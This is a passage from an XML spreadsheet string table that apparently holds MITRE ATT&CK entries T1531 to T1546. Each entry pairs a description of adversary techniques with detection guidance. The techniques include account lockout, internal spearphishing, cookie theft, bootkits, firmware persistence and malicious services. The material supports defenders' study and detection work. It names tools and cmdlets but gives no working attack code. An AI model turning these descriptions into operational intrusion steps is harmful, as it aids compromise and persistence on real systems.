    <t>Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.</t>
  </si>
  <si>
    <t>T1531</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, User Account: User Account Deletion, User Account: User Account Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)
In Windows, [Net](https://attack.mitre.org/software/S0039) utility, &lt;code&gt;Set-LocalUser&lt;/code&gt; and &lt;code&gt;Set-ADAccountPassword&lt;/code&gt; [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the &lt;code&gt;passwd&lt;/code&gt; utility may be used to change passwords. Accounts could also be disabled by Group Policy. 
Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. </t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:
* Event ID 4723 - An attempt was made to change an account's password
* Event ID 4724 - An attempt was made to reset an account's password
* Event ID 4726 - A user account was deleted
* Event ID 4740 - A user account was locked out
Alerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.</t>
  </si>
  <si>
    <t>T1534</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)
For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.
Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)</t>
  </si>
  <si>
    <t>Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing campaigns.(Citation: Trend Micro When Phishing Starts from the Inside 2017)</t>
  </si>
  <si>
    <t>T1535</t>
  </si>
  <si>
    <t>Instance: Instance Creation, Instance: Instance Metadata</t>
  </si>
  <si>
    <t>Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.
Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.
A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.
An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)</t>
  </si>
  <si>
    <t>Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions)</t>
  </si>
  <si>
    <t>T1537</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Cloud Storage: Cloud Storage Creation, Cloud Storage: Cloud Storage Metadata, Cloud Storage: Cloud Storage Modification, Network Traffic: Network Traffic Content, Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata, Snapshot: Snapshot Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.
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Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)
Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) </t>
  </si>
  <si>
    <t>Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. 
In AWS, sharing an Elastic Block Store (EBS) snapshot, either with specified users or publicly, generates a ModifySnapshotAttribute event in CloudTrail logs.(Citation: AWS EBS Snapshot Sharing) Similarly, in Azure, creating a Shared Access Signature (SAS) URI for a Virtual Hard Disk (VHS) snapshot generates a "Get Snapshot SAS URL" event in Activity Logs.(Citation: Azure Blob Snapshots)(Citation: Azure Shared Access Signature)</t>
  </si>
  <si>
    <t>T1538</t>
  </si>
  <si>
    <t>An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)
Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.</t>
  </si>
  <si>
    <t>Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)</t>
  </si>
  <si>
    <t>T1539</t>
  </si>
  <si>
    <t>File: File Access, Process: Process Access</t>
  </si>
  <si>
    <t>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
Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)
There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)
There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)
After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.</t>
  </si>
  <si>
    <t>Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.</t>
  </si>
  <si>
    <t>T1542</t>
  </si>
  <si>
    <t>Command: Command Execution, Drive: Drive Modification, Driver: Driver Metadata, Firmware: Firmware Modification, Network Traffic: Network Connection Creation, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)
Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.</t>
  </si>
  <si>
    <t>Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.
Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014)</t>
  </si>
  <si>
    <t>T1542.001</t>
  </si>
  <si>
    <t>System Firmware (T1542.001)</t>
  </si>
  <si>
    <t>Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)
System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.</t>
  </si>
  <si>
    <t>System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.
Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)</t>
  </si>
  <si>
    <t>T1542.002</t>
  </si>
  <si>
    <t>Component Firmware (T1542.002)</t>
  </si>
  <si>
    <t>Driver: Driver Metadata, Firmware: Firmware Modification, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.
Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.</t>
  </si>
  <si>
    <t>Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components.(Citation: SanDisk SMART)(Citation: SmartMontools) Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.
Disk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014) Also consider comparing components, including hashes of component firmware and behavior, against known good images.</t>
  </si>
  <si>
    <t>T1542.003</t>
  </si>
  <si>
    <t>Bootkit (T1542.003)</t>
  </si>
  <si>
    <t>Drive: Drive Modification</t>
  </si>
  <si>
    <t>Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.
A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)
The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.</t>
  </si>
  <si>
    <t>Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.</t>
  </si>
  <si>
    <t>T1542.004</t>
  </si>
  <si>
    <t>ROMMONkit (T1542.004)</t>
  </si>
  <si>
    <t>Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)
ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.</t>
  </si>
  <si>
    <t>There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.</t>
  </si>
  <si>
    <t>T1542.005</t>
  </si>
  <si>
    <t>TFTP Boot (T1542.005)</t>
  </si>
  <si>
    <t>Command: Command Execution, Firmware: Firmware Modification, Network Traffic: Network Connection Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.
Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)</t>
  </si>
  <si>
    <t>Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)
Review command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. (Citation: Cisco IOS Software Integrity Assurance - Command History) Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. (Citation: Cisco IOS Software Integrity Assurance - Boot Information) Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.</t>
  </si>
  <si>
    <t>T1543</t>
  </si>
  <si>
    <t>Command: Command Execution, Container: Container Creation, Driver: Driver Load, File: File Creation, File: File Modification, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) 
Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  
Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  </t>
  </si>
  <si>
    <t>Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  
Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. 
Monitor for changes to files associated with system-level processes.</t>
  </si>
  <si>
    <t>T1543.001</t>
  </si>
  <si>
    <t>Launch Agent (T1543.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Service: Service Creation, Service: Service Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in &lt;code&gt;/System/Library/LaunchAgents&lt;/code&gt;, &lt;code&gt;/Library/LaunchAgents&lt;/code&gt;, and &lt;code&gt;~/Library/LaunchAgents&lt;/code&gt;.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the &lt;code&gt;Label&lt;/code&gt;, &lt;code&gt;ProgramArguments &lt;/code&gt;, and &lt;code&gt;RunAtLoad&lt;/code&gt; keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.
 Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.
Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the &lt;code&gt;RunAtLoad&lt;/code&gt; or &lt;code&gt;KeepAlive&lt;/code&gt; keys set to &lt;code&gt;true&lt;/code&gt;.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) </t>
  </si>
  <si>
    <t xml:space="preserve">Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.
Ensure Launch Agent's &lt;code&gt; ProgramArguments &lt;/code&gt; key pointing to executables located in the &lt;code&gt;/tmp&lt;/code&gt; or &lt;code&gt;/shared&lt;/code&gt; folders are in alignment with enterprise policy. Ensure all Launch Agents with the &lt;code&gt;RunAtLoad&lt;/code&gt; key set to &lt;code&gt;true&lt;/code&gt; are in alignment with policy. </t>
  </si>
  <si>
    <t>T1543.002</t>
  </si>
  <si>
    <t>Systemd Service (T1543.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  
Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) 
Inside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  
* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.
* `ExecReload` directive executes when a service restarts. 
* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  
Adversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) 
The .service file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. </t>
  </si>
  <si>
    <t>Monitor file creation and modification events of Systemd service unit configuration files in the default directory locations for `root` &amp; `user` level permissions. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the `root` user.(Citation: lambert systemd 2022) 
Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: `systemctl list-units -–type=service –all`. Analyze the contents of `.service` files present on the file system and ensure that they refer to legitimate, expected executables, and symbolic links.(Citation: Berba hunting linux systemd)
Auditing the execution and command-line arguments of the `systemctl` utility, as well related utilities such as `/usr/sbin/service` may reveal malicious systemd service execution.</t>
  </si>
  <si>
    <t>T1543.003</t>
  </si>
  <si>
    <t>Command: Command Execution, Driver: Driver Load, File: File Metadata, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.
Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. 
Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as "Bring Your Own Vulnerable Driver" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)
Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).
To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  
Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services&lt;/code&gt;. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  
Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.
Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.</t>
  </si>
  <si>
    <t>T1543.004</t>
  </si>
  <si>
    <t>Launch Daemon (T1543.004)</t>
  </si>
  <si>
    <t>Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in &lt;code&gt;/System/Library/LaunchDaemons/&lt;/code&gt; and &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt;. Required Launch Daemons parameters include a &lt;code&gt;Label&lt;/code&gt; to identify the task, &lt;code&gt;Program&lt;/code&gt; to provide a path to the executable, and &lt;code&gt;RunAtLoad&lt;/code&gt; to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)
Adversaries may install a Launch Daemon configured to execute at startup by using the &lt;code&gt;RunAtLoad&lt;/code&gt; parameter set to &lt;code&gt;true&lt;/code&gt; and the &lt;code&gt;Program&lt;/code&gt; parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)
Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as &lt;code&gt;usr/local/bin&lt;/code&gt; to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for new files added to the &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt; folder. The System LaunchDaemons are protected by SIP.
Some legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the &lt;code&gt;RunAtLoad&lt;/code&gt; parameter set to true, ensure the &lt;code&gt;Program&lt;/code&gt; parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as &lt;code&gt;Program&lt;/code&gt; and &lt;code&gt;ProgramArguments&lt;/code&gt; parameters but one must be present.(Citation: launchd Keywords for plists)
</t>
  </si>
  <si>
    <t>T1543.005</t>
  </si>
  <si>
    <t>Container Service (T1543.005)</t>
  </si>
  <si>
    <t>Command: Command Execution, Container: Container Creation</t>
  </si>
  <si>
    <t>Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.
For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)
In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)
Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)</t>
  </si>
  <si>
    <t>T1546</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Modification, Command: Command Execution, File: File Creation, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation, WMI: WMI Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)
Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)
Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. 
These mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. 
Monitor for processes, API/System calls, and other common ways of manipulating these event repositories. 
Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  
